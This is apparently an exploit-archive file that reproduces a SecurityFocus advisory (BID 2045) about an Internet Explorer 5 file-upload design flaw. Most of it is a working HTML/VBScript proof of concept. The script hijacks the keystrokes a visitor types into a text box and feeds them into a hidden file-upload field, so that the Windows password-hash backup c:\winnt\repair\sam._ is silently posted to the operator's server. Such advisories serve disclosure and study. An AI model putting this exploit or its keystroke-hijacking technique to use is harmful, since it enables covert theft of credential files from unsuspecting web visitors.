@@ -1,0 +1,99 @@
+source: http://www.securityfocus.com/bid/2045/info
+
+One of the ways users submit information to remote websites is through the INPUT type form options. Users can upload files to remote webservers with the input type=FILE option.
+
+Due to a design error in the implementation of the INPUT TYPE=FILE variable , it is possible for a website operator to specify a known filename from the visitors machine for upload to the website.
+
+This vulnerability is exploitable under certain circumstances, the filename would have to be known by the website operator, the amount of characters that exist in the filename would have to be the same amount of characters the user typed in the form, and the visiting user would need to have at least read access to the known file. This vulnerability does not allow the website operator to delete or modify any files on the visitors machine.
+
+Successful exploitation of this vulnerability could lead to the disclosure of sensitive information and possibly assist in further attacks against the victim. 
+
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft Visual Studio 6.0">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<form action="../get_file.asp" method="POST" enctype="multipart/form-data" id=form1 name=form1>
+<table width="400" align="center" border="0" cellpadding="0" cellspacing="0">
+<tr><td colspan="2" align="right"></td></tr>
+<tr><td bgcolor="000080" width="480">
+<font size="3" color="white"><b>&nbsp;Example.. IE 5 Version</b></font></td><td align="right" bgcolor="FFFFFF">
+</td></tr>
+</table>
+
+<table border="0" width="400" cellspacing="1" cellpadding="2" bgcolor="#000000" align="center">
+    <tr>
+    <td colspan="2" bgcolor="white" align="left"><font face="Verdana" size="2"><b>Text:</b></font>
+    <input type="text" name="userInput" size="31" maxlength="" onKeyPress="myFuncFirst()"></td>
+    </td>
+  </tr>
+    <tr>
+    <td colspan="2" bgcolor="white" align="left"><font face="Verdana" size="2"><b>File:</b></font>
+    <input type="File" name="file" size="31" onFocus="myFocus()" size=0></td>
+    </td>
+  </tr>
+  <tr>
+    <td width="60%">&nbsp;</td>
+    <td width="40%" bgcolor="#FFFFFF" align="right"><input type="submit" id="submit1" name="submit1" value="Post">&nbsp;&nbsp;<input type="reset" value="Reset" id="reset1" name="reset1">
+    <input type="hidden" name="doit" value="1">
+    </td>
+    </tr>
+</table>
+</form>
+<script language="VBScript">
+'A lot of this is pretty, I don't have much time for this kind of stuff.
+'Make changes as you wish, but be sure to include me (key) in your version.
+
+'Declare stuff
+Dim userKey
+Dim charCount
+Dim getFile
+Dim myArray
+
+'67|58|47|87|73|78|78|84|47|82|69|80|65|73|82|47|83|65|77|46|95
+'c  :  \  w  i  n  n  t  \  r  e  p  a  i  r  \  s  a  m  .  _
+
+'Has to be backwards, that's the order I push it into the File field.
+'95|46|77|65|83|47|82|73|65|80|69|82|47|84|78|78|73|87|47|58|67
+'_  .  m  a  s  \  r  i  a  p  e  r  \  t  n  n  i  w  \  :  c
+
+'Set getFile with the correct keycodes
+getFile = "95|46|77|65|83|47|82|73|65|80|69|82|47|84|78|78|73|87|47|58|67"
+
+'ReDim myArray to correct UBound
+ReDim myArray(Len(getFile)/3)
+
+'Index of array to use
+charCount = 0
+
+'Set myArray with a split version of getfile
+myArray = split(getFile, "|")
+
+'This is activated anytime
+Sub myFocus()
+	document.form1.userInput.focus
+	document.form1.userInput.innerText = document.form1.userInput.value
+End Sub
+
+'This is activated with the onKeyPress event of userInput
+Sub myFuncFirst()
+	If charCount < (Len(getFile)/3) Then
+		'Find the key the user pressed
+		userKey = chr(window.event.keyCode)
+		'Change that key to the keycode we want
+		window.event.keyCode = cint(myArray(charCount))
+		'Set focus to form1.file so that our key gets sent to it
+		document.form1.file.focus
+		'Increment charCount to the next char we want
+		charCount = charCount + 1
+		'Make userInput reflect the user's change
+		document.form1.userInput.innerText = document.form1.userInput.value + userKey
+	end if
+End Sub
+</script>
+<P>&nbsp;</P>
+
+</BODY>
+</HTML>
+
